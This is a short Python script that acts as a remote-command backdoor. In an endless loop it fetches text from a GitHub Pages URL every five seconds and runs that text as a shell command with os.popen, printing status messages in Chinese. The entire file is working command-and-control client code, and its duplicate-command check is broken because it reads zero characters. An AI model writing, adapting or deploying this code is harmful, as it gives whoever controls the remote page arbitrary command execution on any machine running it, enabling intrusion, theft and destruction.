import requests
import os
import time


def get_command():
    a = requests.get('https://tyuikl32.github.io/index.html').text
    return a

a=open('command.txt', 'a')
a.close()
def main():
    while True:
        try:
            c = get_command()
            print('收到命令: ' ,c)
            
            with open("command.txt", 'r+') as f:
                if f.readline(0) == c:
                    print('命令已存在')
                elif f.readline(0) != c:
                    with open('command.txt', 'w') as file:
                        file.write('')
                    f.write(c)
                    with os.popen(c) as results:
                        print(results)
                        print('成功执行命令:', c)

        except Exception as e:
            print('Error: ', e)
        
        time.sleep(5)

if __name__ == '__main__':
    main()

    
        



